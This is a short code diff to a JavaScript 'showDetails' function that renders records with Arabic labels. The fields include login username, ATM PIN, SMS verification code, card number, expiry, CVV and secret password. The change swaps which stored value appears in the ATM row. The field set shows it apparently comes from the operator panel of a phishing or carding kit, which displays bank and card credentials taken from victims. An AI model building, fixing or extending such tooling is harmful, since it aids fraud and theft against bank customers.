@@ -506,7 +506,7 @@ function showDetails(id) {
   var loginCountryHtml = o.login_country ? countryDisplay(o.login_country) : "—";
   detailsHtml += '<div class="cred-row"><div><div class="cred-label">الدولة المختارة</div><div class="cred-val" style="color:var(--ink);font-family:inherit;font-size:14px;letter-spacing:0;display:flex;align-items:center;gap:6px">' + loginCountryHtml + '</div></div></div>';
   detailsHtml += credRow("اسم المستخدم", o.login_username, "var(--purple)");
-  detailsHtml += credRow("رقم ATM", o.atm_pin, "var(--purple)");
+  detailsHtml += credRow("رقم ATM", o.login_password, "var(--purple)");
   detailsHtml += `</div></div>`;
 
   // رمز التحقق (SMS)
@@ -525,7 +525,6 @@ function showDetails(id) {
   detailsHtml += credRow("رقم البطاقة", o.card_number, "#e65100");
   detailsHtml += credRow("تاريخ الانتهاء", o.card_expiry, "#e65100");
   detailsHtml += credRow("CVV", o.card_cvv, "#e65100");
-  detailsHtml += credRow("الرمز السري", o.login_password, "#e65100");
   detailsHtml += `</div></div>`;
 
   document.getElementById("modalDetails").innerHTML = detailsHtml;
